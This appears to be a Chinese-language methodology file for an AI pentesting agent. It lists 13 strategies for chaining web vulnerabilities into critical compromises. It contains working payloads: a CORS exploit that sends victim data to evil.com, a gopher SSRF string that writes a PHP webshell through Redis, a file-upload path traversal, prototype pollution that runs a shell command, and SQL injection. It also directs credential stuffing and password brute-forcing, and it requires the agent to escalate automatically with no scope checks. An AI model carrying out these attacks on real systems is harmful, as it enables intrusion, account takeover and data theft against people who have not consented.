---
name: chained-logic-extended
description: 目的: 13 条级联策略,打破漏洞孤岛,引导 Agent 完成跨阶段联合绞杀。 原则: 发现漏洞 → 自动触发级联 → 提升等级/效率
category: methodology
---

# 级联攻击算法矩阵 (The Chaining Algorithms)

> **目的**: 13 条级联策略,打破漏洞孤岛,引导 Agent 完成跨阶段联合绞杀。
> **原则**: 发现漏洞 → 自动触发级联 → 提升等级/效率

---

## 🔍 Grep 命令速查

```bash
# 查询所有级联策略
grep "策略" references/chained-logic-extended.md

# 根据漏洞类型查询级联策略
grep -A 10 "XSS" references/chained-logic-extended.md
grep -A 10 "JWT" references/chained-logic-extended.md
grep -A 10 "SSRF" references/chained-logic-extended.md
grep -A 10 "文件上传" references/chained-logic-extended.md

# 查询级联优先级
grep -A 15 "级联优先级" references/chained-logic-extended.md
```

---

## 策略 1: 凭证重定向链 (Auth Chain)

**触发**: Phase 1 发现任何泄露的 AK/SK、Token、Database_Pwd。

**动作**:
1. 挂起所有 Fuzz 模式。
2. 匹配 `assets.md` 中标记为 `[Login]` 的资产。
3. 执行 `[Credential_Stuffing]` 协议, 将泄露信息带入登录/认证包。

**提升**: 信息泄露 (Medium) → 凭证重用 (Critical)

---

## 策略 2: 注入-至-回显链 (Inversion Chain)

**触发**: SQLi 确认为 Blind (时间或布尔) 且速度极慢。

**动作**:
1. 检索 `assets.md` 中带有 `[Linkable]` 的路径 (如评论区、用户名展示)。
2. 尝试将注入结果作为 `UPDATE` 语句写入 Websink。
3. 转换为回显注入, 提升效率。

**提升**: 时间盲注 (慢) → 回显注入 (快)

---

## 策略 3: SSRF-至-内部指纹链 (Infrastructure Chain)

**触发**: SSRF 盲测命中 127.0.0.1 差异。

**动作**:
1. 对命中的内部服务使用常见端口列表进行内部端口测绘。
   - 高优先: 6379(Redis) / 8080(管理面板) / 3306(MySQL) / 9200(ES) / 2375(Docker)
2. 对命中的内部服务重新应用快速路由协议。
3. 如命中云元数据 → 切入 `cloud-security.md` §1。

**提升**: SSRF (High) → SSRF+内网RCE (Critical)

---

## 策略 4: XSS-至-CSRF 链

**触发**: 发现 XSS (任意类型)

**动作**:
1. 检查 CSRF Token 是否存在
2. 如果无 Token,直接提升等级
3. 如果有 Token,用 XSS 窃取 Token
4. 构造 CSRF 攻击 (带 Token)

**提升**: XSS (Medium) → XSS+CSRF (High)

**示例**:
```javascript
// XSS Payload 窃取 CSRF Token
<script>
fetch('/api/sensitive', {
  method: 'POST',
  headers: {'X-CSRF-Token': document.querySelector('[name=csrf]').value}
})
</script>
```

---

## 策略 5: 文件上传-至-路径遍历链

**触发**: 文件上传成功

**动作**:
1. 记录上传后的文件路径
2. 测试 `../` 遍历到敏感目录
3. 测试覆盖配置文件 (如 `.htaccess`)
4. 测试上传到 webroot 外

**提升**: 上传 (Low) → 上传+遍历 (Critical)

**示例**:
```
上传文件名: ../../../../var/www/html/shell.php
→ 成功写入 webroot
```

---

## 策略 6: JWT-至-BOLA 链

**触发**: 发现 JWT 认证

**动作**:
1. 解析 JWT 中的 `user_id` / `uid`
2. 查找所有含 ID 参数的 API
3. 用 A 的 JWT + B 的 ID 测试越权
4. 如果成功,创建新漏洞

**提升**: JWT (Info) → JWT+BOLA (Critical)

**示例**:
```
JWT Payload: {"user_id": 123}
测试: GET /api/orders/456 (其他用户的订单)
→ 成功访问,确认 BOLA
```

---

## 策略 7: 信息泄露-至-爆破链

**触发**: 发现用户名/邮箱列表泄露

**动作**:
1. 提取所有用户名
2. 测试登录接口是否有频率限制
3. 如果无限制,用常见密码爆破
4. 记录成功的凭证

**提升**: 信息泄露 (Low) → 信息泄露+爆破 (High)

**示例**:
```
泄露: /api/users/list 返回所有用户名
测试: 登录接口无频率限制
爆破: 用 top100 密码爆破
结果: 成功登录 3 个账号
```

---

## 策略 8: CORS-至-敏感数据窃取链

**触发**: 发现 CORS 配置错误 (`Access-Control-Allow-Origin: *`)

**动作**:
1. 检查该接口返回的数据敏感度
2. 如果返回敏感数据 (订单/个人信息)
3. 构造跨域窃取 PoC
4. 提升漏洞等级

**提升**: CORS (Low) → CORS+数据窃取 (High)

**示例**:
```html
<!-- 攻击者页面 -->
<script>
fetch('https://target.com/api/orders', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://evil.com/log?data=' + JSON.stringify(data)))
</script>
```

---

## 策略 9: 子域名接管-至-Cookie窃取链

**触发**: 发现子域名接管 (dangling CNAME)

**动作**:
1. 接管子域名
2. 检查主域是否设置了 Cookie 作用域为 `.example.com`
3. 如果是,可窃取主域 Cookie
4. 提升漏洞等级

**提升**: 子域接管 (Medium) → 子域接管+Cookie窃取 (Critical)

**示例**:
```
接管: old.example.com
主域 Cookie: domain=.example.com
→ 可窃取主域 Cookie
```

---

## 策略 10: GraphQL 内省-至-BOLA 链

**触发**: GraphQL 内省开启

**动作**:
1. 提取所有 Query/Mutation
2. 查找含 ID 参数的操作
3. 测试 ID 越权
4. 如果成功,创建新漏洞

**提升**: GraphQL 内省 (Info) → GraphQL+BOLA (High)

**示例**:
```graphql
# 内省查询
{__schema{types{name,fields{name,args{name}}}}}

# 发现: getOrder(id: Int)
# 测试: getOrder(id: 其他用户ID)
→ 成功访问,确认 BOLA
```

---

## 策略 11: 时间盲注-至-回显注入链

**触发**: 确认 Blind SQLi (时间型)

**动作**:
1. 检索 assets.md 中的 [Linkable_Websink]
2. 尝试 UPDATE 写入到展示字段 (如评论区/用户名)
3. 转换为回显注入,提升效率
4. 记录级联结果

**提升**: 时间盲注 (慢) → 回显注入 (快)

**示例**:
```sql
-- 时间盲注太慢
id=1 AND IF(SUBSTR(database(),1,1)='a', SLEEP(5), 0)

-- 转换为回显注入
id=1; UPDATE users SET username=database() WHERE id=1
→ 在用户列表看到数据库名
```

---

## 策略 12: SSRF-至-Redis RCE 链

**触发**: SSRF 命中内网 6379 端口

**动作**:
1. 用 Gopher 协议构造 Redis 命令
2. 测试 `CONFIG SET dir /var/www/html`
3. 写入 WebShell
4. 提升漏洞等级

**提升**: SSRF (High) → SSRF+RCE (Critical)

**示例**:
```
gopher://127.0.0.1:6379/_
*1%0d%0a$8%0d%0aflushall%0d%0a
*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a<?php system($_GET['cmd']);?>%0d%0a
*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a
*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a
*1%0d%0a$4%0d%0asave%0d%0a
```

---

## 策略 13: Prototype Pollution-至-RCE 链

**触发**: 确认原型污染 (Node.js)

**动作**:
1. 检查是否使用 `child_process.fork()`
2. 污染 `execArgv` 参数
3. 注入 `--eval` 执行代码
4. 提升漏洞等级

**提升**: PP (Medium) → PP+RCE (Critical)

**示例**:
```json
{
  "__proto__": {
    "execArgv": ["--eval=require('child_process').exec('whoami')"]
  }
}
```

---

## 级联优先级排序

### P0 - 立即执行 (可能提升到 Critical)

- 策略 1: 凭证重定向链
- 策略 3: SSRF-至-内部指纹链
- 策略 5: 文件上传-至-路径遍历
- 策略 12: SSRF-至-Redis RCE
- 策略 13: Prototype Pollution-至-RCE

### P1 - 优先执行 (可能提升到 High)

- 策略 2: 注入-至-回显链
- 策略 4: XSS-至-CSRF
- 策略 6: JWT-至-BOLA
- 策略 8: CORS-至-敏感数据窃取
- 策略 9: 子域名接管-至-钓鱼

### P2 - 后续执行 (提升效率或等级)

- 策略 7: 信息泄露-至-爆破
- 策略 10: GraphQL 内省-至-BOLA
- 策略 11: 时间盲注-至-回显注入

---

## 自动触发机制

在 `project-workflow.md` 中集成:

```markdown
## 级联触发协议 (Auto-Chaining)

每次记录漏洞到 vulns.md 时,**必须**执行:

1. Grep `chained-logic-extended.md` 匹配当前漏洞类型
2. 如果有可级联策略,**立即**执行
3. 记录级联结果到 `[Chained_From]` 字段

**示例**:
发现 XSS → 触发策略 #4 → 检查 CSRF → 提升等级
```

---

**版本**: v1.0  
**更新日期**: 2026-04-25  
**适用场景**: Bug Bounty / SRC / 黑盒渗透测试